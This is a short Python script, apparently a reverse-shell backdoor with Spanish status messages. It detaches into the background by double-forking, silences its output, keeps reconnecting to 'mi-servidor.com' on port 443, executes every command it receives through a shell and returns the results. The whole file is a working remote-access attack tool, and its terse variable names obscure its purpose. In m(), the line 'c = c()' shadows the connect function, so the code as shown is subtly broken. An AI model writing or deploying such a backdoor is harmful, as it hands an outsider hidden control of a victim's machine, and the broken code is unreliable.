import socket as s
import subprocess as sub
import os as o
import sys as y
import time as t

l, p, b = "mi-servidor.com", 443, 1024

def d():
    if o.fork(): y.exit()
    o.setsid()
    if o.fork(): y.exit()
    y.stdout, y.stderr, y.stdin = open(o.devnull, 'w'), open(o.devnull, 'w'), open(o.devnull, 'r')

def c():
    while True:
        try:
            c = s.socket(s.AF_INET, s.SOCK_STREAM)
            c.connect((l, p))
            return c
        except Exception as e:
            print(f"Error: {e}. Reintentando...")
            t.sleep(5)

def cd(n):
    try:
        o.chdir(n)
        return f"Cambiado a {n}"
    except Exception as e:
        return f"Error: {str(e)}"

def e(c):
    try:
        out = sub.check_output(c, shell=True, stderr=sub.STDOUT)
        return out.decode("utf-8")
    except sub.CalledProcessError as error:
        return error.output.decode("utf-8")

def m():
    while True:
        c = c()
        while True:
            try:
                d = c.recv(b)
                if not d:
                    print("Conexión cerrada, reconectando...")
                    break
                cmd = d.decode("utf-8").strip()
                if cmd.startswith("cd "):
                    n = cmd.split(" ")[1]
                    r = cd(n)
                    c.send(r.encode())
                    continue
                if len(cmd) > 0:
                    r = e(cmd)
                    c.send(r.encode())
            except Exception as error:
                print(f"Error: {str(error)}. Reconectando...")
                break

if __name__ == "__main__":
    d()
    m()
